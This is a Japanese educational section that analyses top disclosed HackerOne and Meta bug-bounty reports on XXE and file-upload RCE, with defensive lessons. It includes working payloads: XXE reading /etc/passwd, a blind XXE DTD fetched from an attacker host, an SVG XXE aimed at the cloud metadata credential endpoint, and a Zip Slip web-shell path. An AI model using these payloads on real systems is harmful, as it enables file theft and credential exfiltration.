## 報告集約リポジトリ（TOPXXE/TOPRCE）

本節では、HackerOneで公開されたレポートをupvote数・賞金額で機械的に集計している`reddelexc/hackerone-reports`リポジトリの`TOPXXE.md`・`TOPRCE.md`（および補助的に`TOPUPLOAD.md`）を素材に、XXE（XML External Entity、XML外部エンティティ）とファイルアップロード起点の脆弱性がどのように実戦で悪用されてきたかを、上位事例の技術的な仕組みとともに読み解く。あわせて`jaiswalakshansh/Facebook-BugBounty-Writeups`（Meta/Facebookバグバウンティのwriteup集）を確認し、この分野の報告傾向の偏りについても触れる。いずれも既に公開・修正済みのレポートであり、対象組織への追試や再現は行わない。読者が学ぶべきは個別の企業名ではなく、**同じ脆弱性クラスがどのパターンで繰り返し発生するか**という構造である。

### reddelexc/hackerone-reportsの位置づけ

`reddelexc/hackerone-reports`は「Top disclosed reports from HackerOne」を謳うリポジトリで、Pythonスクリプト（`fetcher.py`でHackerOneから収集、`uniquer.py`で重複排除、`filler.py`で情報補完、`rater.py`でランキング生成）によって定期的に自動更新されている。生データは`data.csv`に集約され、そこから脆弱性タイプ別（`docs/tops_by_bug_type/`）・プログラム別（`docs/tops_by_program/`）にMarkdownへ整形される。星6,500超・フォーク1,100超という規模から、脆弱性研究者の間で「まず読むべきキュレーション」として定着していることがわかる。本節で参照する`TOPXXE.md`・`TOPRCE.md`・`TOPUPLOAD.md`は、このリポジトリの`docs/tops_by_bug_type/`配下にある（リポジトリのREADME上の相対リンクは`tops_by_bug_type/`だが、実体は`docs/`ディレクトリ配下に置かれている点に注意。パスが変わることがあるため、必ず最新のディレクトリ構成を確認すること）。

> 出典: reddelexc/hackerone-reports — https://github.com/reddelexc/hackerone-reports

### TOPXXE.mdを読み解く：XXEの実戦傾向

`TOPXXE.md`の上位55件を通覧すると、対象企業には偏りがある一方で、**攻撃の技術的パターンはごく少数の型に収束する**ことがわかる。まず一覧の上位を抜粋する（2026年時点でのスナップショット。upvote・賞金は今後も変動しうる）。

| 順位 | タイトル | 対象プログラム | upvote | 賞金 |
|---|---|---|---|---|
| 1 | XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx | Starbucks | 319 | $0 |
| 2 | XXE on pulse.mail.ru | Mail.ru | 264 | $6,000 |
| 3 | XXE on sms-be-vip.twitter.com in SXMP Processor | X / xAI | 258 | $0 |
| 4 | XXE on https://duckduckgo.com | DuckDuckGo | 218 | $0 |
| 7 | Multiple endpoints are vulnerable to XML External Entity injection (XXE) | Pornhub | 138 | $2,500 |
| 10 | XXE Injection through SVG image upload leads to SSRF | Zivver | 112 | $0 |
| 12 | [RCE] Unserialize to XXE - file disclosure | Pornhub | 90 | $0 |

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md

以下、学びの多い5件を掘り下げる。

#### Starbucks: `.aspx`エンドポイントのXXE（319 upvotes, $0）

report #500515「XXE at ecjobs.starbucks.com.cn」は、`/retail/hxpublic_v6/hxdynamicpage6.aspx`および`/recruitjob/hxpublic_v6/hxdynamicpage6.aspx`という2つの`.aspx`（ASP.NET）エンドポイントが、ユーザーから送られてくるXMLをそのまま外部エンティティ有効の状態でパースしていたことが原因のXXEである。**なぜASP.NET系の古いエンドポイントでXXEが頻出するのか**という一般的な背景を補足すると、.NET Frameworkの`XmlDocument`クラスは歴史的に`XmlResolver`がデフォルトで有効（つまり外部エンティティの解決を許可する設定）になっていたバージョンが長く使われており、開発者が明示的に`XmlResolver = null`を設定しない限りXXEに対して脆弱なままになる。賞金が$0なのは、この報告がVDP（Vulnerability Disclosure Program、報奨金なしの脆弱性開示プログラム）のスコープだったためであり、重大度と報奨額が比例しない典型例でもある。319 upvotesという突出した支持数は、「巨大企業の求人・採用サブドメインという、本体サービスから見落とされがちな周辺システムに深刻な脆弱性が残っている」という教材的価値の高さを反映している。

#### Mail.ru: pulse.mail.ruのRSS/Atomパーサ経由XXE（264 upvotes, $6,000）

report #505947は、`pulse.mail.ru`のRSS/Atomフィード取り込み機能が、フィードXML中の外部エンティティを解決してしまうことでローカルファイルの読み取りに繋がった事例である。RSS/Atomはそもそも「外部から与えられたURLの内容をサーバーが能動的に取得してパースする」機能であり、次の2点が重なるとXXEの標的になりやすい。

1. RSSリーダー・アグリゲーター機能は、任意のURLからXMLを取得するため、**攻撃者が完全に内容を制御できるXML文書**をサーバーに解析させられる。
2. RSS/Atomのパースには多くの場合、汎用のXMLパーサライブラリがそのまま流用され、フィード専用の安全なサブセットパーサが使われていないことが多い。

典型的な攻撃ペイロードは以下のような形になる。

```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    ...
  </channel>
</rss>
```

**なぜこれでファイルの中身が読めるのか。** XML 1.0仕様は、DTD（Document Type Definition、文書の構造を定義する宣言部）内で`<!ENTITY 名前 SYSTEM "URI">`という形式の外部一般実体（external general entity）を宣言できる。パーサがこの宣言を許可した状態で文書本体中に`&xxe;`という参照を書くと、パーサは指定されたURI（ここでは`file://`スキームでローカルファイルパス）の内容を取得し、参照箇所にそのまま展開してから残りの処理を続行する。結果として、パース後に生成される値（この例では`<title>`要素の値）に`/etc/passwd`の中身がそのまま埋め込まれ、それがアプリケーションのレスポンスや後続処理（フィードのタイトル表示など）を通じて攻撃者に見えてしまう。$6,000という高額な賞金は、単なるDoSではなく機密ファイルの直接窃取（in-band、レスポンスに結果がそのまま返る形式）に到達したことを反映している。

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md
> 出典: Mail.ru disclosed on HackerOne — Report #505947 — https://hackerone.com/reports/505947

#### DuckDuckGo: `x.js`の`u`パラメータ経由XXEとその修正バイパス（218 upvotes / 159 upvotes）

report #483774は、`duckduckgo.com`の`x.js`エンドポイントが`u`パラメータ経由で受け取るXMLを外部エンティティ有効のまま解析していたことによるXXEである。特筆すべきは、この報告に対して一度パッチが適用された後、**同じ研究者が修正の不備を突いてブラインドXXE（レスポンスに直接結果が現れず、外部通信の発生有無だけで判定するXXE）でのバイパス**を追加報告している点である（report #486732、「Partial bypass of #483774 with Blind XXE」）。これは、XXE対策として「危険な外部実体参照だけを個別にブロックする」フィルタ的な修正では不十分であり、**外部実体解決そのものをパーサレベルで無効化しない限り、別のペイロード変種（パラメータ実体、CDATA併用、異なるプロトコルスキームなど）で再発しうる**ことを示す好例である。

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">
  %xxe;
]>
```

これはパラメータ実体（`%`で始まる、DTD内でのみ参照可能な実体）を使い、外部の悪意あるDTDファイルを読み込ませる手法である。レスポンスに結果が直接出ないブラインドXXEの場合、この外部DTD内でさらにファイル内容をOOB（Out-of-Band、帯域外）チャネル経由——典型的には攻撃者が用意したサーバーへのDNSクエリやHTTPリクエストとして——exfiltrate（外部への持ち出し）するテクニックが使われる。攻撃者はサーバーのアクセスログやDNSクエリログを監視するだけで、レスポンスを介さずファイル内容を断片的に復元できる。

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md
> 出典: DuckDuckGo disclosed on HackerOne — Report #483774, #486732 — https://hackerone.com/reports/483774 , https://hackerone.com/reports/486732

#### Pornhub: 複数エンドポイントにまたがるXXE（138 upvotes, $2,500）

report #72272「Multiple endpoints are vulnerable to XML External Entity injection (XXE)」は、単一のエンドポイントではなく**アプリケーション内の複数箇所で同種のXXEが横断的に存在していた**ことを示す報告で、任意のリクエストをプロダクションサーバー起点で送信できる（SSRF的な影響を含む）ことが評価され$2,500の報奨に至っている。同社では別途report #142562「[RCE] Unserialize to XXE - file disclosure」も上位に入っており、これはPHPの`unserialize()`（シリアライズされた文字列からオブジェクトを復元する関数）に渡すデータの中にXML関連クラス（SimpleXMLElementなど）のシリアライズ表現を紛れ込ませることで、**デシリアライズ処理の副作用としてXXEを引き起こす**、いわゆる「PHPオブジェクトインジェクション経由のXXE」パターンである。この手法の核心は、アプリケーションが「XMLを直接パースしていない」つもりでも、内部で使われているシリアライズ/デシリアライズの仕組みがXMLパーサを暗黙に呼び出していれば、入力経路のフィルタリングをすり抜けてXXEが成立しうるという点にある。**入力の型（フォームなのかJSONなのかシリアライズ文字列なのか）ではなく、最終的にどのパーサ・ライブラリに到達するか（sink、入力が最終的に危険な形で処理される到達点）で脆弱性の有無を判断する必要がある**ことを示す教材的な事例である。

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md
> 出典: Pornhub disclosed on HackerOne — Report #72272, #142562 — https://hackerone.com/reports/72272 , https://hackerone.com/reports/142562

#### Zivver: SVGアップロード経由のXXE→SSRF（112 upvotes, $0）

report #897244は、プロフィール画像としてSVG画像をアップロードできる機能が、**SVGファイルの中身をXMLとしてサーバー側で解析（サムネイル生成やメタデータ抽出のため）する際に外部エンティティを解決してしまう**ことによるXXEで、最終的にSSRF（Server-Side Request Forgery、サーバーに任意の内部/外部リクエストを送らせる攻撃）に到達した。SVGは仕様上XML 1.0のサブセットであり、画像フォーマットであると同時に完全なXML文書でもあるため、**「画像アップロード機能」という一見XMLと無関係な入口が、実はXXEの入口になりうる**という、本教科書のテーマ（XXE×ファイルアップロード）を最も直接的に体現する事例である。典型的な悪用ペイロードは次のような形になる。

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg width="128px" height="128px" xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**なぜこれがSSRFにまで到達するのか。** XXEの外部実体参照は`file://`スキームに限らず、`http://`・`https://`など任意のURIスキームを指定できる。パーサがネットワークアクセス可能な環境で動作していれば、サーバー自身に指定URLへのリクエストを発行させることができ、これは古典的なSSRFと等価な効果を持つ。上記ペイロードはクラウド環境のメタデータエンドポイント（多くのクラウドプロバイダが`169.254.169.254`というリンクローカルアドレスでインスタンスメタデータ・一時認証情報を提供する仕組み）を狙う定型パターンで、成功すればサーバーが動いているクラウド環境の一時的なIAM認証情報がSVGのレンダリング結果（テキスト要素の内容）としてそのまま画面や生成画像に露出する。SVGアップロード機能を提供するサービスでは、アップロード直後のサムネイル生成やプレビュー処理が「サーバー内部で信頼された処理」として扱われがちで、外部入力に対する警戒が薄れやすい点が、この種の脆弱性が繰り返し発生する根本原因である。

> 出典: reddelexc/hackerone-reports — TOPXXE.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXXE.md
> 出典: Zivver disclosed on HackerOne — Report #897244, "XXE Injection through SVG image upload leads to SSRF" — https://hackerone.com/reports/897244

### TOPRCE.md / TOPUPLOAD.mdに見る「ファイルアップロード起点RCE」の型

`TOPRCE.md`（上位158件）と`TOPUPLOAD.md`（アップロード関連に特化した集計）を突き合わせると、ファイルアップロード機能を起点とするRCEには大きく次の3系統があることが読み取れる。

1. **アップロードしたファイルがそのままWebサーバーの実行可能領域に配置され、直接実行される**（Webシェル型）
2. **アップロードしたファイルをサーバー側の処理系（画像変換・メタデータ処理・展開処理など）に渡した結果、その処理系自体の脆弱性が誘発される**（処理系脆弱性誘発型）
3. **アップロードを足がかりに、SSRFなど別クラスの脆弱性と連鎖させて内部コンポーネントを攻撃する**（連鎖型）

#### Webシェル型: Starbucks「ecjobs.starbucks.com.cn」（688 upvotes, $0）

`TOPUPLOAD.md`第2位のreport #506646「Webshell via File Upload on ecjobs.starbucks.com.cn」は、同じStarbucksの求人サブドメインで、アップロードされたファイルの拡張子・内容種別の検証が不十分なまま、Webサーバーがスクリプトとして実行できる領域に保存されてしまうという、ファイルアップロード脆弱性の最も基本的かつ最も破壊力の大きいパターンである。**なぜ拡張子チェックだけでは不十分なのか**という原則は、サーバー側の実行判定がしばしば「拡張子」ではなく「Content-Type」や「サーバー設定（例: Apacheの`AddHandler`、IISのハンドラマッピング）」に依存しており、`.php`を弾いても`.phtml`・`.pht`・大文字小文字違い・二重拡張子（`.jpg.php`）・null byteによる拡張子切り詰めなど、検証ロジックの想定漏れを突く変種が非常に多いためである。

#### 処理系脆弱性誘発型: GitLab「ExifTool経由のRCE」（508 upvotes, $20,000）

report #1154542「RCE when removing metadata with ExifTool」は、ユーザーがアップロードした画像からメタデータ（Exif情報）を除去する機能が、内部で呼び出しているExifToolというサードパーティツールの脆弱性（DjVuファイル形式のパース処理に起因する既知の深刻な脆弱性、CVE-2021-22204として公表）を誘発し、任意コード実行に到達した事例である。**このパターンの本質は、アプリケーション自身のコードに直接の脆弱性がなくても、「アップロードされたファイルを解釈する依存ライブラリ」が攻撃対象になる**という点にある。防御側の観点では、アップロードされたファイルを処理するあらゆる外部ツール・ライブラリ（画像変換、PDF生成、アーカイブ展開、メタデータ抽出、ウイルススキャン等）のバージョンを常に最新に保ち、既知のCVEを追跡することが、アプリケーションコードのレビューと同格の重要度を持つ。

#### 連鎖型: Aiven「Kafka Connect経由のRCE」（56 upvotes, $5,000）

report #1547877「[Kafka Connect] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia」は、ファイルアップロード・SSRF・内部監視エンドポイントの3つを連結させた高度な攻撃連鎖である。手順を整理すると次の通りである。

1. JDBC Sink Connector（Kafkaのメッセージを外部データベースに書き込む機能）が同梱するSQLite JDBCドライバの機能を悪用し、**任意のSQLiteデータベースファイルをサーバー上の任意パスにアップロード（書き込み）**する。
2. HTTP Sink Connectorを使い、サーバー自身に`localhost`宛てのHTTPリクエストを発行させる（SSRF）。
3. `localhost:6725`で保護なしに待ち受けていたJolokia（JMX、Java Management Extensionsの情報をHTTP経由で公開するツール）のエンドポイントに対し、`com.sun.management:type=DiagnosticCommand` MBeanが持つ`jvmtiAgentLoad`という操作（任意のネイティブエージェント/JARをロードできる機能）を呼び出す。
4. 手順1でアップロード済みの悪意あるJARファイルをロードさせ、リモートコード実行に至る。

**この事例が示す重要な原則は、「ファイルアップロード」「SSRF」「内部管理エンドポイントの認証欠如」という個別には中〜高程度の脆弱性が、組み合わさることでクリティカルなRCEに変貌する**という点である。単体のバグバウンティレポートとして評価する際も、防御側の脅威モデリングにおいても、「この脆弱性単体の影響は限定的だから優先度を下げる」という判断は、他の脆弱性との連鎖可能性を考慮しないと誤りうる。

> 出典: reddelexc/hackerone-reports — TOPRCE.md / TOPUPLOAD.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPRCE.md , https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPUPLOAD.md
> 出典: GitLab disclosed on HackerOne — Report #1154542 — https://hackerone.com/reports/1154542
> 出典: Aiven Ltd disclosed on HackerOne — Report #1547877 — https://hackerone.com/reports/1547877

### Facebook BugBounty Writeups集：XXEレポートの不在が示すもの

`jaiswalakshansh/Facebook-BugBounty-Writeups`は、2019年以降のMeta（Facebook/Instagram/WhatsApp）バグバウンティwriteupを年別に集約したキュレーションリポジトリで、著者名・報奨額・公開日とともに数百件のリンクが整理されている。このリポジトリ全体を通覧すると、**XXEを明示的なテーマとするwriteupは見当たらない**。これは偶然ではなく、Metaのバックエンドの多くがThrift/Protocol Buffersなどバイナリベースのシリアライズプロトコルを内製で多用しており、外部から与えられる生のXMLを汎用XMLパーサで直接処理する経路自体が構造的に少ないためだと考えられる（一般的傾向としての推測であり、Meta社内の実装詳細が公開されているわけではない）。この事実自体が読者への教訓になる。**XXEは「XMLパーサに到達する入力経路がどれだけ存在するか」に強く依存する脆弱性クラス**であり、SOAP API、Office文書（docx/xlsx等はZIP+XMLの複合フォーマット）、SVGアップロード、RSS/Atom取り込み、SAML認証（SAMLアサーションはXML）など、XMLを前提とした機能を多用する組織ほど攻撃対象領域が広がる。逆に言えば、脆弱性調査に着手する際は、対象サービスが「どこでXMLを受け取っているか」（Content-Typeが`application/xml`/`text/xml`のエンドポイント、拡張子が`.xml`/`.svg`/`.docx`等のファイルアップロード、SAML SSOのコールバック等）を棚卸しすることが、XXEハンティングの出発点になる。

一方で同リポジトリには、ファイルアップロード×アーカイブ処理に関連する事例として、report「Meta's SparkAR RCE Via ZIP Path Traversal」（Fady Othman、2022年4月7日公開、$2,500）が掲載されている。これはSparkAR（Meta製のARエフェクト開発ツール）が受け取るプロジェクトファイル（ZIPアーカイブ形式）の展開処理で、ZIP内のエントリ名にパストラバーサル文字列（`../../`等）を含めることで、展開先を本来のディレクトリ外に逃がし、任意パスへのファイル書き込みからRCEに至った事例である。これはいわゆる「Zip Slip」と呼ばれる既知の脆弱性パターン（2018年にSnykが体系的に報告し広く知られるようになった）で、**アーカイブ展開処理を実装する際は、各エントリの展開先パスを正規化した上で、必ず展開先ベースディレクトリの内側に収まっているかを検証しなければならない**という、ファイルアップロード機能の防御実装における基本原則を再確認させる事例である。

```
# Zip Slipの典型的な悪性エントリ名（概念例。実サービスへの適用・検証は行わないこと）
../../../../var/www/html/shell.php
```

> 出典: jaiswalakshansh/Facebook-BugBounty-Writeups — https://github.com/jaiswalakshansh/Facebook-BugBounty-Writeups
> 出典: Meta's SparkAR RCE Via ZIP Path Traversal — Fady Othman — https://blog.fadyothman.com/metas-sparkar/

### まとめ：報告集約リポジトリから読み取るべき実務上の示唆

以上の事例を横断して整理すると、次の3点が実務上の要点となる。

- **XXEは「XMLを直接送信するAPI」だけでなく、SVGアップロード・Office文書解析・RSS取り込みなど、間接的にXMLパーサへ到達する経路すべてが攻撃対象になる。** パーサレベルでの外部実体解決の無効化（`XmlResolver = null`相当の設定、libxml2の`LIBXML_NOENT`を使わない、DTD処理自体を無効化する等）が唯一の確実な対策であり、個別ペイロードのブラックリスト的フィルタは再発を防げない（DuckDuckGoの修正バイパス事例が示す通り）。
- **ファイルアップロード起点のRCEは、アプリケーション自身のコードだけでなく、アップロードされたファイルを処理する依存ライブラリ・外部ツール（画像変換、メタデータ抽出、アーカイブ展開）のサプライチェーン全体が攻撃対象になる。** バージョン管理とCVE追跡が、コードレビューと同等以上に重要である。
- **個別には中程度に見える脆弱性（アップロード権限、SSRF、内部管理ポートの認証欠如）も、連鎖させると致命的なRCEになりうる。** Aiven/Kafka Connectの事例のように、脅威モデリングは単一の脆弱性の影響度だけでなく、他の弱点との組み合わせ可能性まで含めて評価する必要がある。

これらのリポジトリは日々更新されるため、本節で示した順位・upvote数・賞金額はあくまで取得時点のスナップショットである。継続的な学習には、`reddelexc/hackerone-reports`をウォッチ登録し、新規に上位入りしたレポートを定期的に確認することを推奨する。
